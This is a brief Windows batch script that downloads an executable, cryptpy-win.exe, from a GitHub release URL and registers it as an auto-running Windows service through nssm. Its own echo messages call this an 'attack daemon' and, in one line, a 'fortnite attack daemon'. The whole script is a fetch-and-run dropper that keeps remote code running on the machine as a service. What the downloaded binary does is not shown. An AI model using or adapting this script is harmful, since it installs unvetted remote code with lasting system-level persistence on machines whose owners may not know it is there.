SET version=%1

mkdir C:\.cryptpy

copy .\nssm.exe C:\.cryptpy

C:

cd C:\.cryptpy

SET downloadUrl=https://github.com/mitsukomegumi/CryptPy.js/releases/download/%version%/cryptpy-win.exe

SET downloadCommand=curl -S -L %downloadUrl% --output C:\.cryptpy\cryptpy-win.exe

SET downloadPath=C:\.cryptpy

echo "attempting attack with method %downloadCommand%"

%downloadCommand%

.\nssm.exe install CryptPy %downloadPath%\cryptpy-win.exe

echo "installed attack daemon"

SC START CryptPy

echo "started fortnite attack daemon"